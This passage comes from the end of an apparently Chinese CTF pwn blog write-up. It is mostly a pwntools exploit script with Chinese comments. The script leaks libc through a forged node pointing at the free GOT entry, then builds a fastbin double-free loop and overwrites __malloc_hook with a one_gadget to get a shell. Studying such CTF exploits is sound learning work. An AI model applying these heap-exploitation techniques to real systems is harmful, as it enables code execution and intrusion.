io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    <span class="comment"># 索引40字节的句子，与节点大小相同</span></span><br><span class="line">    index((<span class="string">b&#x27;aaaa b cccc &#x27;</span>).ljust(<span class="number">40</span>, <span class="string">b&#x27;d&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除句子</span></span><br><span class="line">    search(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 索引一个64字节的新句子，分配新的堆</span></span><br><span class="line">    <span class="comment"># 新节点复用之前释放的内存</span></span><br><span class="line">    <span class="comment"># 新节点会连接到旧链表</span></span><br><span class="line">    index(<span class="string">b&#x27;e&#x27;</span>*<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再次查找旧节点中的单词，触发删除</span></span><br><span class="line">    <span class="comment"># 删除句子，我们现在在fastbin中有一个40字节的空闲块</span></span><br><span class="line">    <span class="comment"># 这个块仍然被用作节点</span></span><br><span class="line">    search(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造节点</span></span><br><span class="line">    node =  p64(<span class="number">0x400E90</span>)   <span class="comment"># word pointer &quot;Enter&quot;</span></span><br><span class="line">    node += p64(<span class="number">5</span>)          <span class="comment"># word length</span></span><br><span class="line">    node += p64(free_got)   <span class="comment"># sentence pointer (GOT address of free)</span></span><br><span class="line">    node += p64(<span class="number">64</span>)         <span class="comment"># length of sentence</span></span><br><span class="line">    node += p64(<span class="number">0x00000000</span>) <span class="comment"># set next pointer is null</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入新句子伪造节点+</span></span><br><span class="line">    <span class="comment"># 节点中指针字段指向got</span></span><br><span class="line">    index(node)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查找该伪造节点</span></span><br><span class="line">    <span class="comment"># 于是打印出libc地址</span></span><br><span class="line">    search(<span class="string">b&#x27;Enter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Found 64: &#x27;</span>)</span><br><span class="line">    leak = io.recvline().split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    leak = u64(leak)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除会出现段错误</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> leak </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_free</span>():</span><br><span class="line">    <span class="comment"># 索引三个堆(句子)，之后删除它们，让 fastbin 链表形成一个环</span></span><br><span class="line">    index((<span class="string">b&quot;aaaa &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))   <span class="comment"># chunk1</span></span><br><span class="line">    index((<span class="string">b&quot;bbbb c &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>)) <span class="comment"># chunk2</span></span><br><span class="line">    index((<span class="string">b&quot;dddd &quot;</span>).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))   <span class="comment"># chunk3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除三个堆，形成一个环</span></span><br><span class="line">    <span class="comment"># 首先删除chunk1，由于chunk1的fd为NULL，此处使用chunk1绕过if条件</span></span><br><span class="line">    <span class="comment"># chunk1不作为fastbin环的成员</span></span><br><span class="line">    search(<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)   <span class="comment"># free(chunk1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按序删除chunk2和chunk3，形成chunk3-&gt;chunk2-&gt;chunk1链路</span></span><br><span class="line">    search(<span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)   <span class="comment"># free(chunk2)</span></span><br><span class="line">    search(<span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)   <span class="comment"># free(chunk3)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再次删除chunk2，形成chunk2-&gt;chunk3-&gt;chunk2环</span></span><br><span class="line">    search(<span class="string">b&quot;\x00&quot;</span>)    </span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;(y/n)?&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)   <span class="comment"># free(chunk2)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hajack_got</span>(<span class="params">hook, one_gadget</span>):</span><br><span class="line">    <span class="comment"># __malloc_hook地址作为伪造的fd指针</span></span><br><span class="line">    fake_fd = hook</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 复用之前的chunk2，并覆写fd指针为__malloc_hook地址</span></span><br><span class="line">    <span class="comment"># 这一步后实际链表结构变成main_arena-&gt;chunk3-&gt;chunk2-&gt;__malloc_hook</span></span><br><span class="line">    <span class="comment"># fd设置偏移35字节，字节错位，绕过size字段检查</span></span><br><span class="line">    index((p64(fake_fd-<span class="number">35</span>)).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再次分配两个chunk，让main_arena指向__malloc_hook</span></span><br><span class="line">    index(<span class="string">b&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">    index(<span class="string">b&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入one_gadget地址到__malloc_hook</span></span><br><span class="line">    <span class="comment"># 注意填充19字节的垃圾数据，覆盖掉__malloc_hook前的padding</span></span><br><span class="line">    index((<span class="string">b&quot;a&quot;</span>*<span class="number">19</span> + p64(one_gadget)).ljust(<span class="number">0x60</span>, <span class="string">b&quot;z&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(): </span><br><span class="line">    free_addr = leak_libc()</span><br><span class="line">    libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    one_gadget = libc_base + <span class="number">0xd5bf7</span> <span class="comment"># 0x3f3d6 0x3f42a  </span></span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Free address: <span class="subst">&#123;<span class="built_in">hex</span>(free_addr)&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;__malloc_hook: <span class="subst">&#123;<span class="built_in">hex</span>(hook)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    double_free()</span><br><span class="line"></span><br><span class="line">    hajack_got(hook,one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/heap-overflow/" rel="tag"># heap-overflow</a>
+              <a href="/tags/double-free%EF%BC%8Cfastbin-size-misalignment/" rel="tag"># double-free，fastbin-size-misalignment</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/04/07/2026-04-07-Unlink/" rel="prev" title="学习笔记：Unlink">
+                  <i class="fa fa-angle-left"></i> 学习笔记：Unlink
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder"></span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
